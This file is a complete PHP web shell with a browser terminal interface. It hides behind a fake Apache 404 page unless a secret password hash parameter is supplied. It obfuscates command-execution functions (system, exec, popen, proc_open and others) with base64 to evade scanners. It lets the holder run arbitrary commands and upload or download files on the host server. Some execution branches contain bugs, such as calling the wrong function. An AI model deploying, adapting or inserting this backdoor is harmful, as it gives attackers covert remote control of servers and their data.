<?php
if (!isset($_GET['h']) || !password_verify(urldecode(base64_decode($_GET['h'])), '$argon2i$v=19$m=65536,t=4,p=1$elFRN0pBbnRsL21hRGg4dw$No/IZ7OfyP9Wh8AYM6AYQkU7cfmPflEzGSQJEuXO4v4')) {
    http_response_code(404);
    exit("
        <html>
            <head><title>404 Not Found</title></head>
            <body bgcolor='white'>
                <h1>Not Found</h1>
                The requested URL " . $_SERVER['SCRIPT_NAME'] . " was not found on this server.
                <hr><i>Apache/" . $_SERVER['SERVER_SOFTWARE'] . " Server at " . $_SERVER['SERVER_NAME'] . " Port " . $_SERVER['SERVER_PORT'] . "</i>
            </body>
        </html>");
}

$SH_CONF = array(
    'username' => 'user',
    'hostname' => 'host',
);

function expandPath($path)
{
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        $stdout = [];
        base64_decode('ZXhlYw==')("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function manyFunctionExists(array $list = [])
{
    foreach ($list as $entry) {
        if (!function_exists(base64_decode($entry))) {
            return false;
        }
    }
    return true;
}

function launch_pwn($action)
{
    $output = '';
    $funcs = ['c3lzdGVt', 'cGFzc3RocnU=', 'c2hlbGxfZXhlYw==', 'ZXhlYw==', 'cG9wZW4=', 'cHJvY19vcGVu'];

    if (function_exists(base64_decode($funcs[0]))) {
        if (manyFunctionExists(['b2Jfc3RhcnQ=', 'b2JfZ2V0X2NsZWFu', 'b2JfZW5kX2NsZWFu'])) {
            ob_start();
            base64_decode($funcs[0])($action);
            $output = ob_get_contents();
            ob_end_clean();
        } else {
            $output = $funcs[0]($action);
        }
    } elseif (function_exists(base64_decode($funcs[1]))) {
        if (manyFunctionExists(['b2Jfc3RhcnQ=', 'b2JfZ2V0X2NsZWFu', 'b2JfZW5kX2NsZWFu'])) {
            ob_start();
            base64_decode($funcs[0])($action);
            $output = ob_get_contents();
            ob_end_clean();
        } else {
            $output = $funcs[0]($action);
        }
    } elseif (function_exists(base64_decode($funcs[2]))) {
        $output = $funcs[2]($action);
    } elseif (function_exists(base64_decode($funcs[3]))) {
        $output = [];
        $funcs[3]($action, $output);
        $output = implode("\n", $output);
    } elseif (manyFunctionExists([$funcs[4], 'ZmVvZg==', 'ZnJlYWQ=', 'cGNsb3Nl'])) {
        $fp = base64_decode($funcs[0])($action, 'r');
        while (!base64_decode('ZmVvZg==')($fp)) {
            $output .= base64_decode('ZnJlYWQ=')($fp, 1024);
        }
        base64_decode('cGNsb3Nl')($fp);
    } elseif (manyFunctionExists(['c3RyZWFtX2dldF9jb250ZW50cw==', 'cHJvY19jbG9zZQ=='])) {
        $pipes = [];
        $process = base64_decode($funcs[0])($action, [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']], $pipes);
        $output = base64_decode('c3RyZWFtX2dldF9jb250ZW50cw==')($pipes[1]);
        base64_decode('cHJvY19jbG9zZQ==')($process);
    }
    return $output;
}

function isRunningWindows()
{
    return stripos(PHP_OS, "WIN") === 0;
}

function featSh($cmd, $cwd)
{
    $stdout = "";

    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        base64_decode('Y2hkaXI=')(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        base64_decode('Y2hkaXI=')($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        base64_decode('Y2hkaXI=')(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        base64_decode('Y2hkaXI=')($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        base64_decode('Y2hkaXI=')($cwd);
        $stdout = launch_pwn($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
        "cwd" => base64_encode(getcwd())
    );
}

function featurePwd()
{
    return array("cwd" => base64_encode(getcwd()));
}

function featureHint($fileName, $cwd, $type)
{
    chdir($cwd);
    if ($type == 'cmd') {
        $action = "compgen -c $fileName";
    } else {
        $action = "compgen -f $fileName";
    }
    $action = base64_decode('L2Jpbi9iYXNoIC1j') . " " . "\"$action\"";
    $files = explode("\n", base64_encode('c2hlbGxfZXhlYw==')($action));
    foreach ($files as &$filename) {
        $filename = base64_encode($filename);
    }
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath)
{
    $file = @file_get_contents($filePath);
    if ($file === false) {
        return array(
            'stdout' => base64_encode('File not found / no read permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        return array(
            'name' => base64_encode(basename($filePath)),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd)
{
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === false) {
        return array(
            'stdout' => base64_encode('Invalid path / no write permission.'),
            'cwd' => base64_encode(getcwd())
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => base64_encode('Done.'),
            'cwd' => base64_encode(getcwd())
        );
    }
}

function initShellConfig()
{
    global $SH_CONF;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SH_CONF['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SH_CONF['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SH_CONF['hostname'] = $hostname;
    }
}

if (isset($_GET["feature"])) {

    $response = null;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featSh($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    exit();
} else {
    initShellConfig();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>index</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            background: #333;
            color: #eee;
            font-family: monospace;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }

        *::-webkit-scrollbar-track {
            border-radius: 8px;
            background-color: #353535;
        }

        *::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        *::-webkit-scrollbar-thumb {
            border-radius: 8px;
            -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
            background-color: #bcbcbc;
        }

        #shell {
            background: #222;
            box-shadow: 0 0 5px rgba(0, 0, 0, .3);
            font-size: 10pt;
            display: flex;
            flex-direction: column;
            align-items: stretch;
            max-width: calc(100vw - 2 * var(--shell-margin));
            max-height: calc(100vh - 2 * var(--shell-margin));
            resize: both;
            overflow: hidden;
            width: 100%;
            height: 100%;
            margin: var(--shell-margin) auto;
        }

        #shell-content {
            overflow: auto;
            padding: 5px;
            white-space: pre-wrap;
            flex-grow: 1;
        }

        :root {
            --shell-margin: 25px;
        }

        @media (min-width: 1200px) {
            :root {
                --shell-margin: 50px !important;
            }
        }

        @media (max-width: 991px),
        (max-height: 600px) {
            :root {
                --shell-margin: 0 !important;
            }

            #shell {
                resize: none;
            }
        }

        @media (max-width: 767px) {
            #shell-input {
                flex-direction: column;
            }
        }

        .shell-prompt {
            font-weight: bold;
            color: #75DF0B;
        }

        .shell-prompt>span {
            color: #1BC9E7;
        }

        #shell-input {
            display: flex;
            box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
            border-top: rgba(255, 255, 255, .05) solid 1px;
            padding: 10px 0;
        }

        #shell-input>label {
            flex-grow: 0;
            display: block;
            padding: 0 5px;
            height: 30px;
            line-height: 30px;
        }

        #shell-input #shell-cmd {
            height: 30px;
            line-height: 30px;
            border: none;
            background: transparent;
            color: #eee;
            font-family: monospace;
            font-size: 10pt;
            width: 100%;
            align-self: center;
            box-sizing: border-box;
        }

        #shell-input div {
            flex-grow: 1;
            align-items: stretch;
        }

        #shell-input input {
            outline: none;
        }
    </style>

    <script>
        var SH_CONF = <?php echo json_encode($SH_CONF); ?>;
        var CWD = null;
        var commandHistory = [];
        var historyPosition = 0;
        var eShellCmdInput = null;
        var eShellContent = null;
        let searchParams = window.location.search;

        function _insertCommand(command) {
            eShellContent.innerHTML += "\n\n";
            eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
            eShellContent.innerHTML += escapeHtml(command);
            eShellContent.innerHTML += "\n";
            eShellContent.scrollTop = eShellContent.scrollHeight;
        }

        function _insertStdout(stdout) {
            eShellContent.innerHTML += escapeHtml(stdout);
            eShellContent.scrollTop = eShellContent.scrollHeight;
        }

        function _defer(callback) {
            setTimeout(callback, 0);
        }

        function featSh(command) {

            _insertCommand(command);
            if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
            } else if (/^\s*clear\s*$/.test(command)) {
                // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                eShellContent.innerHTML = '';
            } else {
                makeRequest("&feature=shell", {
                    cmd: command,
                    cwd: CWD
                }, function(response) {
                    if (response.hasOwnProperty('file')) {
                        featureDownload(atob(response.name), response.file)
                    } else {
                        _insertStdout(atob(response.stdout));
                        updateCwd(atob(response.cwd));
                    }
                });
            }
        }

        function featureHint() {
            if (eShellCmdInput.value.trim().length === 0) return; // field is empty -> nothing to complete

            function _requestCallback(data) {
                if (data.files.length <= 1) return; // no completion
                data.files = data.files.map(function(file) {
                    return atob(file);
                });
                if (data.files.length === 2) {
                    if (type === 'cmd') {
                        eShellCmdInput.value = data.files[0];
                    } else {
                        var currentValue = eShellCmdInput.value;
                        eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                    }
                } else {
                    _insertCommand(eShellCmdInput.value);
                    _insertStdout(data.files.join("\n"));
                }
            }

            var currentCmd = eShellCmdInput.value.split(" ");
            var type = (currentCmd.length === 1) ? "cmd" : "file";
            var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

            makeRequest(
                "&feature=hint", {
                    filename: fileName,
                    cwd: CWD,
                    type: type
                },
                _requestCallback
            );

        }

        function featureDownload(name, file) {
            var element = document.createElement('a');
            element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
            element.setAttribute('download', name);
            element.style.display = 'none';
            document.body.appendChild(element);
            element.click();
            document.body.removeChild(element);
            _insertStdout('Done.');
        }

        function featureUpload(path) {
            var element = document.createElement('input');
            element.setAttribute('type', 'file');
            element.style.display = 'none';
            document.body.appendChild(element);
            element.addEventListener('change', function() {
                var promise = getBase64(element.files[0]);
                promise.then(function(file) {
                    makeRequest('&feature=upload', {
                        path: path,
                        file: file,
                        cwd: CWD
                    }, function(response) {
                        _insertStdout(atob(response.stdout));
                        updateCwd(atob(response.cwd));
                    });
                }, function() {
                    _insertStdout('An unknown client-side error occurred.');
                });
            });
            element.click();
            document.body.removeChild(element);
        }

        function getBase64(file, onLoadCallback) {
            return new Promise(function(resolve, reject) {
                var reader = new FileReader();
                reader.onload = function() {
                    resolve(reader.result.match(/base64,(.*)$/)[1]);
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        function genPrompt(cwd) {
            cwd = cwd || "~";
            var shortCwd = cwd;
            if (cwd.split("/").length > 3) {
                var splittedCwd = cwd.split("/");
                shortCwd = "…/" + splittedCwd[splittedCwd.length - 2] + "/" + splittedCwd[splittedCwd.length - 1];
            }
            return SH_CONF["username"] + "@" + SH_CONF["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
        }

        function updateCwd(cwd) {
            if (cwd) {
                CWD = cwd;
                _updatePrompt();
                return;
            }
            makeRequest("&feature=pwd", {}, function(response) {
                CWD = atob(response.cwd);
                _updatePrompt();
            });

        }

        function escapeHtml(string) {
            return string
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;");
        }

        function _updatePrompt() {
            var eShellPrompt = document.getElementById("shell-prompt");
            eShellPrompt.innerHTML = genPrompt(CWD);
        }

        function _onShellCmdKeyDown(event) {
            switch (event.key) {
                case "Enter":
                    featSh(eShellCmdInput.value);
                    insertToHistory(eShellCmdInput.value);
                    eShellCmdInput.value = "";
                    break;
                case "ArrowUp":
                    if (historyPosition > 0) {
                        historyPosition--;
                        eShellCmdInput.blur();
                        eShellCmdInput.value = commandHistory[historyPosition];
                        _defer(function() {
                            eShellCmdInput.focus();
                        });
                    }
                    break;
                case "ArrowDown":
                    if (historyPosition >= commandHistory.length) {
                        break;
                    }
                    historyPosition++;
                    if (historyPosition === commandHistory.length) {
                        eShellCmdInput.value = "";
                    } else {
                        eShellCmdInput.blur();
                        eShellCmdInput.focus();
                        eShellCmdInput.value = commandHistory[historyPosition];
                    }
                    break;
                case 'Tab':
                    event.preventDefault();
                    featureHint();
                    break;
            }
        }

        function insertToHistory(cmd) {
            commandHistory.push(cmd);
            historyPosition = commandHistory.length;
        }

        function makeRequest(url, params, callback) {
            full_url = searchParams + url;

            function getQueryString() {
                var a = [];
                for (var key in params) {
                    if (params.hasOwnProperty(key)) {
                        a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                    }
                }
                return a.join("&");
            }
            fetch(full_url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: getQueryString()
                })
                .then(response => {
                    if (response.ok) {
                        return response.json();
                    }
                    throw new Error('Network response was not ok');
                })
                .then(responseJson => {
                    callback(responseJson);
                })
                .catch(error => {
                    alert("Error while fetching: " + error);
                });
        }

        document.onclick = function(event) {
            event = event || window.event;
            var selection = window.getSelection();
            var target = event.target || event.srcElement;

            if (target.tagName === "SELECT") {
                return;
            }

            if (!selection.toString()) {
                eShellCmdInput.focus();
            }
        };

        window.onload = function() {
            eShellCmdInput = document.getElementById("shell-cmd");
            eShellContent = document.getElementById("shell-content");
            updateCwd();
            eShellCmdInput.focus();
        };
    </script>
</head>

<body>
    <div id="shell">
        <pre id="shell-content"></pre>
        <div id="shell-input">
            <label for="shell-cmd" id="shell-prompt" class="shell-prompt"></label>
            <div>
                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)" />
            </div>
        </div>
    </div>
</body>

</html>